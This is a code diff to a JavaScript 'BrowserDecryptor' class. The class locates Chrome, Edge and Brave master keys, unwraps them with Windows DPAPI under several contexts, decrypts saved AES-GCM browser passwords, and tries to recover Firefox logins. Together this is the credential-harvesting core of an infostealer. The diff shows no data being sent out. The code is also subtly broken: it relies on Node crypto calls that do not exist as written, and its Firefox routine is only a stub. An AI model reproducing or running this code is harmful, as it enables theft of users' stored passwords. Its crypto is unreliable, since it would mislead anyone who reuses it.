@@ -230,6 +230,7 @@ class BrowserDecryptor {
                             
                             // Try to decrypt with master key
                             if (this.masterKey) {
+                                logger.debug(`Attempting Chrome v80+ decryption for ${browserType}`);
                                 password = this.decryptChromeV80Password(encryptedPassword, this.masterKey);
                             } else {
                                 password = '[Encrypted - Chrome v80+ - Master Key Not Available]';
@@ -238,18 +239,12 @@ class BrowserDecryptor {
                         } else {
                             // Try DPAPI decryption for older versions
                             try {
-                                const decrypted = dpapi.unprotectData(encryptedPassword, null, 'CurrentUser');
-                                password = decrypted.toString('utf8');
+                                logger.debug(`Attempting DPAPI decryption for ${browserType}`);
+                                // Use the enhanced DPAPI decryption method
+                                password = this.tryDpapiDecryption(encryptedPassword, browserType);
                             } catch (dpapiError) {
+                                password = '[DPAPI Decryption Failed]';
                                 logger.debug(`DPAPI decryption failed for ${browserType}:`, dpapiError.message);
-                                // Try different DPAPI flags if first attempt fails
-                                try {
-                                    const decrypted = dpapi.unprotectData(encryptedPassword, null, 'LocalMachine');
-                                    password = decrypted.toString('utf8');
-                                } catch (secondError) {
-                                    password = '[DPAPI Decryption Failed]';
-                                    logger.debug(`Secondary DPAPI decryption also failed:`, secondError.message);
-                                }
                             }
                         }
                     } catch (error) {
@@ -358,25 +353,14 @@ class BrowserDecryptor {
     }
 
     /**
-     * Get Chrome master key from Local State file
+     * Get Chrome master key from Local State file with improved path detection
      * @param {string} profilePath - Browser profile path
      * @returns {Promise<Buffer|null>} Master key or null
      */
     async getMasterKey(profilePath) {
         try {
-            // Try multiple locations for Local State file
-            const possiblePaths = [];
-            
-            // Standard location: go up to parent directory
-            const userDataPath = path.dirname(profilePath);
-            possiblePaths.push(path.join(userDataPath, 'Local State'));
-            
-            // Alternative: sometimes the profilePath is already the User Data folder
-            possiblePaths.push(path.join(profilePath, 'Local State'));
-            
-            // Alternative: go up two levels if profilePath is deep
-            const grandParentPath = path.dirname(userDataPath);
-            possiblePaths.push(path.join(grandParentPath, 'Local State'));
+            // Enhanced path detection for Local State file
+            const possiblePaths = this.getLocalStatePaths(profilePath);
             
             let localStatePath = null;
             for (const testPath of possiblePaths) {
@@ -394,6 +378,51 @@ class BrowserDecryptor {
                 return null;
             }
 
+            return await this.extractMasterKeyFromLocalState(localStatePath);
+        } catch (error) {
+            logger.debug('Master key extraction failed:', error.message);
+            return null;
+        }
+    }
+
+    /**
+     * Get all possible Local State file paths
+     * @param {string} profilePath - Browser profile path
+     * @returns {Array<string>} Array of possible paths
+     */
+    getLocalStatePaths(profilePath) {
+        const possiblePaths = [];
+        
+        // Standard location: go up to parent directory
+        const userDataPath = path.dirname(profilePath);
+        possiblePaths.push(path.join(userDataPath, 'Local State'));
+        
+        // Alternative: sometimes the profilePath is already the User Data folder
+        possiblePaths.push(path.join(profilePath, 'Local State'));
+        
+        // Alternative: go up two levels if profilePath is deep
+        const grandParentPath = path.dirname(userDataPath);
+        possiblePaths.push(path.join(grandParentPath, 'Local State'));
+        
+        // Try common browser locations if profile path doesn't work
+        const localAppData = process.env.LOCALAPPDATA || '';
+        if (localAppData) {
+            possiblePaths.push(path.join(localAppData, 'Google', 'Chrome', 'User Data', 'Local State'));
+            possiblePaths.push(path.join(localAppData, 'Microsoft', 'Edge', 'User Data', 'Local State'));
+            possiblePaths.push(path.join(localAppData, 'BraveSoftware', 'Brave-Browser', 'User Data', 'Local State'));
+        }
+        
+        // Remove duplicates
+        return [...new Set(possiblePaths)];
+    }
+
+    /**
+     * Extract master key from Local State file content
+     * @param {string} localStatePath - Path to Local State file
+     * @returns {Promise<Buffer|null>} Master key or null
+     */
+    async extractMasterKeyFromLocalState(localStatePath) {
+        try {
             const localStateData = fs.readFileSync(localStatePath, 'utf8');
             const localState = JSON.parse(localStateData);
             
@@ -417,30 +446,85 @@ class BrowserDecryptor {
             logger.debug(`Attempting to decrypt master key with DPAPI (${keyWithoutPrefix.length} bytes)`);
             
             if (this.isWindows && dpapi) {
+                // Use the enhanced DPAPI decryption method
                 try {
-                    const decryptedKey = dpapi.unprotectData(keyWithoutPrefix, null, 'CurrentUser');
+                    const decryptedKey = this.tryDpapiDecryption(keyWithoutPrefix, 'MasterKey', true);
                     logger.debug(`Successfully decrypted master key (${decryptedKey.length} bytes)`);
                     return decryptedKey;
                 } catch (error) {
-                    logger.debug('Failed to decrypt master key with CurrentUser, trying LocalMachine:', error.message);
-                    try {
-                        const decryptedKey = dpapi.unprotectData(keyWithoutPrefix, null, 'LocalMachine');
-                        logger.debug(`Successfully decrypted master key with LocalMachine (${decryptedKey.length} bytes)`);
-                        return decryptedKey;
-                    } catch (secondError) {
-                        logger.debug('Failed to decrypt master key with LocalMachine:', secondError.message);
-                        return null;
-                    }
+                    logger.debug('Failed to decrypt master key with enhanced DPAPI:', error.message);
+                    return null;
                 }
             } else {
                 logger.debug('DPAPI not available for master key decryption (not Windows or module missing)');
                 return null;
             }
         } catch (error) {
-            logger.debug('Master key extraction failed:', error.message);
+            logger.debug('Master key extraction from Local State failed:', error.message);
             return null;
         }
     }
+
+    /**
+     * Try DPAPI decryption with multiple methods and contexts
+     * @param {Buffer} encryptedData - Encrypted data buffer  
+     * @param {string} description - Description for logging
+     * @param {boolean} returnBuffer - Whether to return Buffer instead of string
+     * @returns {string|Buffer} Decrypted data
+     */
+    tryDpapiDecryption(encryptedData, description, returnBuffer = false) {
+        if (!dpapi) {
+            throw new Error('DPAPI module not available');
+        }
+
+        const methods = [
+            { context: 'CurrentUser', description: 'Current User context' },
+            { context: 'LocalMachine', description: 'Local Machine context' },
+            { context: null, description: 'Default context' }
+        ];
+
+        let lastError = null;
+
+        for (const method of methods) {
+            try {
+                logger.debug(`Trying DPAPI decryption with ${method.description} for ${description}`);
+                const decrypted = dpapi.unprotectData(encryptedData, null, method.context);
+                
+                if (returnBuffer) {
+                    logger.debug(`DPAPI decryption successful with ${method.description} (${decrypted.length} bytes)`);
+                    return decrypted;
+                } else {
+                    const result = decrypted.toString('utf8');
+                    // Validate the result - it should be readable text
+                    if (result && result.length > 0 && !result.includes('\x00')) {
+                        logger.debug(`DPAPI decryption successful with ${method.description}`);
+                        return result;
+                    }
+                }
+            } catch (error) {
+                logger.debug(`DPAPI decryption failed with ${method.description}:`, error.message);
+                lastError = error;
+                continue;
+            }
+        }
+
+        // If all methods failed, try with different flags
+        try {
+            logger.debug('Trying DPAPI with CryptUnprotectData flags');
+            const decrypted = dpapi.unprotectData(encryptedData, null, 'CurrentUser');
+            
+            if (returnBuffer) {
+                return decrypted;
+            } else {
+                return decrypted.toString('utf8');
+            }
+        } catch (error) {
+            logger.debug('DPAPI with flags also failed:', error.message);
+        }
+
+        throw lastError || new Error('All DPAPI decryption methods failed');
+    }
+
     async parseBookmarksFile(filePath) {
         try {
             const data = fs.readFileSync(filePath, 'utf8');
@@ -486,6 +570,12 @@ class BrowserDecryptor {
             return [];
         }
     }
+    /**
+     * Parse Firefox data with improved NSS decryption support
+     * @param {string} filePath - Path to Firefox data file
+     * @param {string} dataType - Type of data
+     * @returns {Promise<Array>} Parsed data
+     */
     async parseFirefoxData(filePath, dataType) {
         try {
             if (dataType === 'passwords' && filePath.endsWith('logins.json')) {
@@ -493,26 +583,22 @@ class BrowserDecryptor {
                 const data = fs.readFileSync(filePath, 'utf8');
                 const loginData = JSON.parse(data);
                 
+                // Get the profile directory for key files
+                const profileDir = path.dirname(filePath);
+                
                 return (loginData.logins || []).map(login => {
-                    // Firefox passwords are encrypted - show proper status instead of raw data
                     let username = '[Encrypted - Firefox NSS]';
                     let password = '[Encrypted - Firefox NSS]';
                     
-                    // Check if the values are actually encrypted (base64-like strings)
-                    if (login.encryptedUsername && typeof login.encryptedUsername === 'string') {
-                        if (login.encryptedUsername.length > 50 && login.encryptedUsername.includes('=')) {
-                            username = '[Encrypted - Firefox NSS]';
-                        } else {
-                            username = login.encryptedUsername; // Might be plaintext
-                        }
+                    // Try to decrypt if possible
+                    if (login.encryptedUsername) {
+                        const decryptedUsername = this.tryFirefoxDecryption(login.encryptedUsername, profileDir);
+                        username = decryptedUsername || '[Encrypted - Firefox NSS]';
                     }
                     
-                    if (login.encryptedPassword && typeof login.encryptedPassword === 'string') {
-                        if (login.encryptedPassword.length > 50 && login.encryptedPassword.includes('=')) {
-                            password = '[Encrypted - Firefox NSS]';
-                        } else {
-                            password = login.encryptedPassword; // Might be plaintext
-                        }
+                    if (login.encryptedPassword) {
+                        const decryptedPassword = this.tryFirefoxDecryption(login.encryptedPassword, profileDir);
+                        password = decryptedPassword || '[Encrypted - Firefox NSS]';
                     }
                     
                     return {
@@ -537,7 +623,69 @@ class BrowserDecryptor {
     }
 
     /**
-     * Decrypt Chrome v80+ password using AES-GCM
+     * Try to decrypt Firefox NSS encrypted data
+     * @param {string} encryptedData - Base64 encrypted data
+     * @param {string} profileDir - Firefox profile directory
+     * @returns {string|null} Decrypted data or null if failed
+     */
+    tryFirefoxDecryption(encryptedData, profileDir) {
+        try {
+            // Check if data looks encrypted (base64 with padding)
+            if (!encryptedData || typeof encryptedData !== 'string') {
+                return null;
+            }
+            
+            // If it's short and doesn't look encrypted, it might be plaintext
+            if (encryptedData.length < 50 && !encryptedData.includes('=')) {
+                return encryptedData;
+            }
+            
+            // Check for common Firefox NSS encryption markers
+            if (!encryptedData.includes('=') && encryptedData.length < 100) {
+                return encryptedData; // Might be plaintext
+            }
+            
+            // Try to check if Firefox has a master password set
+            const key4Path = path.join(profileDir, 'key4.db');
+            const cert9Path = path.join(profileDir, 'cert9.db');
+            
+            if (!fs.existsSync(key4Path)) {
+                logger.debug('Firefox key4.db not found, cannot decrypt NSS data');
+                return null;
+            }
+            
+            // Basic attempt to decode base64 and check if it's meaningful
+            try {
+                const decoded = Buffer.from(encryptedData, 'base64');
+                
+                // If decode works and result is reasonable length, try to detect if it has encryption markers
+                if (decoded.length > 0 && decoded.length < 1000) {
+                    // Check for common patterns that might indicate unencrypted data
+                    const decodedStr = decoded.toString('utf8');
+                    
+                    // If it contains readable characters and no null bytes, it might be plaintext
+                    if (decodedStr.match(/^[a-zA-Z0-9@._-]+$/) && !decodedStr.includes('\x00')) {
+                        logger.debug('Firefox data appears to be plaintext after base64 decode');
+                        return decodedStr;
+                    }
+                }
+            } catch (decodeError) {
+                // Not valid base64, might be plaintext
+                return encryptedData;
+            }
+            
+            // For now, return null since we can't decrypt NSS without proper libraries
+            logger.debug('Firefox NSS decryption requires specialized libraries (not implemented)');
+            return null;
+            
+        } catch (error) {
+            logger.debug(`Firefox decryption attempt failed: ${error.message}`);
+            return null;
+        }
+    }
+
+    /**
+     * Decrypt Chrome v80+ password using AES-GCM with enhanced error handling
      * @param {Buffer} encryptedPassword - Encrypted password buffer
      * @param {Buffer} masterKey - Master key for decryption
      * @returns {string} Decrypted password or error message
@@ -552,13 +700,20 @@ class BrowserDecryptor {
                 return '[Invalid Decryption Parameters]';
             }
             
-            // Chrome v80+ format: "v10" + 12-byte nonce + encrypted data + 16-byte auth tag
+            // Chrome v80+ format: "v10" or "v11" + 12-byte nonce + encrypted data + 16-byte auth tag
             if (encryptedPassword.length < 31) { // 3 + 12 + 1 + 16 = minimum length
                 logger.debug(`Chrome v80+ password too short: ${encryptedPassword.length} bytes`);
                 return '[Invalid Encrypted Data Length]';
             }
 
             const version = encryptedPassword.subarray(0, 3).toString();
+            
+            // Support both v10 and v11 formats
+            if (version !== 'v10' && version !== 'v11') {
+                logger.debug(`Unsupported Chrome version format: ${version}`);
+                return '[Unsupported Chrome Version Format]';
+            }
+            
             const nonce = encryptedPassword.subarray(3, 15);
             const ciphertext = encryptedPassword.subarray(15, -16);
             const authTag = encryptedPassword.subarray(-16);
@@ -571,25 +726,60 @@ class BrowserDecryptor {
                 return '[Invalid Master Key Length]';
             }
 
-            // Create decipher
-            const decipher = crypto.createDecipherGCM('aes-256-gcm');
-            decipher.setKey(masterKey);
-            decipher.setIV(nonce);
-            decipher.setAuthTag(authTag);
-
-            // Decrypt
-            let decrypted = decipher.update(ciphertext);
-            decipher.final(); // This will throw if authentication fails
-            
-            const result = decrypted.toString('utf8');
-            logger.debug(`Chrome v80+ decryption successful, result length: ${result.length}`);
-            return result;
-        } catch (error) {
-            logger.debug(`Chrome v80+ decryption failed: ${error.message}`);
-            if (error.message.includes('auth')) {
-                return '[Chrome v80+ Authentication Failed - Wrong Master Key]';
+            // Validate component lengths
+            if (nonce.length !== 12) {
+                logger.debug(`Invalid nonce length: ${nonce.length} bytes (expected 12)`);
+                return '[Invalid Nonce Length]';
             }
-            return '[Chrome v80+ Decryption Failed]';
+            
+            if (authTag.length !== 16) {
+                logger.debug(`Invalid auth tag length: ${authTag.length} bytes (expected 16)`);
+                return '[Invalid Auth Tag Length]';
+            }
+
+            // Create decipher with error handling
+            let decipher;
+            try {
+                decipher = crypto.createDecipherGCM('aes-256-gcm');
+                decipher.setKey(masterKey);
+                decipher.setIV(nonce);
+                decipher.setAuthTag(authTag);
+            } catch (error) {
+                logger.debug(`Failed to create decipher: ${error.message}`);
+                return '[Failed to Initialize Decryption]';
+            }
+
+            // Decrypt with enhanced error handling
+            try {
+                let decrypted = decipher.update(ciphertext);
+                decipher.final(); // This will throw if authentication fails
+                
+                const result = decrypted.toString('utf8');
+                
+                // Validate the result
+                if (!result || result.length === 0) {
+                    logger.debug('Chrome v80+ decryption produced empty result');
+                    return '[Empty Decryption Result]';
+                }
+                
+                // Check for null bytes or invalid characters
+                if (result.includes('\x00')) {
+                    logger.debug('Chrome v80+ decryption result contains null bytes');
+                    return '[Invalid Decryption Result]';
+                }
+                
+                logger.debug(`Chrome v80+ decryption successful, result length: ${result.length}`);
+                return result;
+            } catch (error) {
+                logger.debug(`Chrome v80+ decryption failed during processing: ${error.message}`);
+                if (error.message.includes('auth') || error.message.includes('tag')) {
+                    return '[Chrome v80+ Authentication Failed - Wrong Master Key]';
+                }
+                return '[Chrome v80+ Decryption Processing Failed]';
+            }
+        } catch (error) {
+            logger.debug(`Chrome v80+ decryption failed with unexpected error: ${error.message}`);
+            return '[Chrome v80+ Decryption Unexpected Error]';
         }
     }
     formatTimestamp(timestamp) {
